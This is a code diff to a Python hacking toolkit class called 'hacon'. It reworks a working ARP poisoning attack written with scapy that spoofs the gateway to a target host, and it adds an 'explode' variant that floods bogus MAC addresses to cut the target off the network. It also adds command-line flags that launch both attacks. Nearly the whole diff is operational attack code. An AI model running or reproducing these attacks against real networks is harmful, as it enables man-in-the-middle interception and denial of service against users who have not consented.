@@ -138,6 +138,22 @@ class hacon:
         except:
             raise Exception("Please specify the interface")
     
+
+    def set_gateway(self, gateway):
+        """
+        Set gateway
+        """
+        self.gateway = gateway
+
+    def get_gateway(self):
+        """
+        Get gateway
+        """
+        try:
+            return self.gateway
+        except:
+            raise Exception("Please specify the gateway")
+
     def set_url(self):
         """
         Get url
@@ -775,35 +791,74 @@ class hacon:
 
         self.printg(f"[*] Finished files and dirs detection on {self.get_target()}")
     
-    def arp_poisoning(self, gateway_ip):
+    def arp_poisoning(self):
         """
         Send ARP poisoning to target
         """
 
         print()
         target = self.get_target()
+        gateway = self.get_gateway()
         self.printg(f"[*] Starting ARP poisoning attack on {self.get_target()}")
         verbose = int(self.verbose)
         self.verbose = 0
         target_mac = self.get_mac_address(self.get_target())
-        gateway_mac = self.get_mac_address(gateway_ip)
+        gateway_mac = self.get_mac_address(self.get_gateway())
         self.verbose = verbose
 
         try:
             number = 0
             while True:
-                send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway_ip),verbose=False)
-                send(ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=target),verbose=False)
+                send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway),verbose=False)
+                send(ARP(op=2,pdst=gateway,hwdst=gateway_mac,psrc=target),verbose=False)
                 number += 2
                 sys.stdout.write("\r" + "[*] ARP poisoning attack sending packets " + str(number))
                 sys.stdout.flush()
-                time.sleep(3)
+                time.sleep(2)
         except KeyboardInterrupt:
-            send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway_ip,hwsrc=gateway_mac),verbose=False,count=6)
-            send(ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=target,hwsrc=target_mac),verbose=False,count=6)
+            send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway,hwsrc=gateway_mac),verbose=False,count=6)
+            send(ARP(op=2,pdst=gateway,hwdst=gateway_mac,psrc=target,hwsrc=target_mac),verbose=False,count=6)
 
+        print()
+        print()
+        print()
         self.printg(f"[*] Finished ARP poisoning attack on {target}")
 
+    def arp_poisoning_explode(self):
+        """
+        Send ARP poisoning to target and explode
+        """
+
+        print()
+        target = self.get_target()
+        gateway = self.get_gateway()
+        self.printg(f"[*] Starting ARP poisoning and explode attack on {self.get_target()}")
+        verbose = int(self.verbose)
+        self.verbose = 0
+        real_target_mac = self.get_mac_address(self.get_target())
+        real_gateway_mac = self.get_mac_address(gateway)
+        self.verbose = verbose
+
+        target_mac =  "57-4B-D0-63-95-37"
+        gateway_mac = "4A-D6-FD-72-4F-0F"
+
+        try:
+            number = 0
+            while True:
+                send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway),verbose=False)
+                send(ARP(op=2,pdst=gateway,hwdst=gateway_mac,psrc=target),verbose=False)
+                number += 2
+                sys.stdout.write("\r" + "[*] ARP poisoning and explode attack sending packets " + str(number))
+                sys.stdout.flush()
+                time.sleep(2)
+        except KeyboardInterrupt:
+            send(ARP(op=2,pdst=target,hwdst=real_target_mac,psrc=gateway,hwsrc=real_gateway_mac),verbose=False,count=6)
+            send(ARP(op=2,pdst=gateway,hwdst=real_gateway_mac,psrc=target,hwsrc=real_target_mac),verbose=False,count=6)
+
+        print()
+        print()
+        print()
+        self.printg(f"[*] Finished ARP poisoning and explode attack on {target}")
 
     def http_packet_analyzer(self):
         """
@@ -869,6 +924,7 @@ atadogan06@gmail.com - onuratakan
         parser.add_argument("-v", "--verbose", type=int, default = hacon.verbose, help="increase output verbosity")
 
         parser.add_argument('-t', '--target', type=str, help='Target address')
+        parser.add_argument('-g', '--gateway', type=str, help='Gateway address')
         parser.add_argument('-p', '--port', type=int, help='Port number')
 
 
@@ -922,7 +978,9 @@ atadogan06@gmail.com - onuratakan
         parser.add_argument('-f', '--filesanddirs', action="store_true", help='Files and dirs file')
 
 
-        parser.add_argument('-arpp', '--arpspoosoning', type=str, nargs=1, metavar="Gateway ip", help='ARP spoofing')
+        parser.add_argument('-arpp', '--arpspoosoning', action="store_true", help='ARP spoofing')
+
+        parser.add_argument('-arppe', '--arpspoosoningexplode', action="store_true", help='ARP spoofing and explode')
 
         parser.add_argument('-httppa', '--httppacketanalyzer', action="store_true", help='HTTP packet analyzer')
 
@@ -942,6 +1000,9 @@ atadogan06@gmail.com - onuratakan
         
         if not args.target is None:
             self.set_target(args.target)
+
+        if not args.gateway is None:
+            self.set_gateway(args.gateway)
         
         if not args.interface is None:
             self.set_interface(args.interface)
@@ -1037,8 +1098,10 @@ atadogan06@gmail.com - onuratakan
         if args.subdomains:
             self.subdomains_detection()
 
-        if not args.arpspoosoning is None:
-            self.arp_poisoning(args.arpspoosoning[0])
+        if args.arpspoosoning:
+            self.arp_poisoning()
+        if args.arpspoosoningexplode:
+            self.arp_poisoning_explode()
 
         if args.httppacketanalyzer:
             self.http_packet_analyzer()
